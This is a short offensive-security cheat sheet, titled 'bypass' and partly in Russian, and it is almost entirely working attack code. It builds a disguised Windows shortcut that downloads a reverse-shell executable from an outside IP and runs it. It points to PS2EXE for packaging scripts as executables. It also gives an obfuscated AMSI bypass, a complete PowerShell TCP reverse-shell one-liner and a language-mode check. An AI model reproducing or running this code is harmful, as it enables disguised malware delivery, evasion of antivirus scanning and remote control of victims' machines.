# bypass
bypass
create lnk
    
    $s=New-Object -ComObject WScript.Shell
    $l=$s.CreateShortcut("$env:USERPROFILE\Desktop\links\test.lnk")
    $l.TargetPath = "cmd.exe"
    $l.Arguments = "/c curl -o %temp%\foto.exe http://100.100.31.64:8081/simplereshell1010.exe && start %temp%\foto.exe"
    $l.IconLocation = "%windir%\system32\imageres.dll, 100"
    $l.Save()


# С помощью утилиты https://github.com/MScholtes/PS2EXE создать .exe
        https://github.com/MScholtes/PS2EXE 



# AMSI мать его

    [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsiInit'+'Failed','NonPublic,Static').SetValue($null,!$false)

    $c=New-Object System.Net.Sockets.TCPClient('192.168.0.104',9001);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()


# PowerShell ConstrainedLanguage Mode

    $ExecutionContext.SessionState.LanguageMode
